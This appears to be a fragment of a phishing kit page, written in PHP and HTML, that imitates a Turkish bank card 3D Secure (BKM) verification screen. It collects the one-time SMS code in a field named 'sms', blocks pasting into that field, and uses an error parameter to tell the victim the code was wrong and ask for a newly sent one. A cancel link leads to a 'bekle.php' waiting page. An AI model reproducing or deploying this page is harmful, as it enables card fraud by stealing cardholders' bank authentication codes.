...
$hata = false;
if($_GET) {
    if($_GET['hata'] == "true" || isset($_GET['retry'])) $hata = true;
    else $hata = false;
}
    ...
    <div class="content-wrapper">
      <div class="header">
        <div class="brand-logo">
          <img 3dslogo="scheme" align="left" src="./bkm_acs_files/go.png">
        </div>
      </div>
      <div id="approve-page">
            ...
            <div class="form-wrapper">
              ...
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" action="<?php echo $hata == true ? "?hata=true" : "" ?>" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
                  ...
                  <input 3dsinput="password" type="text" class="f-input" onpaste="return false;" ondrop="return false;" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
                <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;">
						<?php if($hata) echo '<p style="color:red;text-align: center">Yanlış kod girdiniz, lütfen yeniden gönderilen kodu giriniz.</p>'; ?>
                ...
                <div class="call-to-action">
                  ...
                  <div style="display: none;">
                    <div class="panel" id="canceldialog">
                      ...
                      <a href="../bekle.php" class="button btn-1 close-modal">Vazgeç</a>
                    </div>
                  </div>
                </div>
              </form>
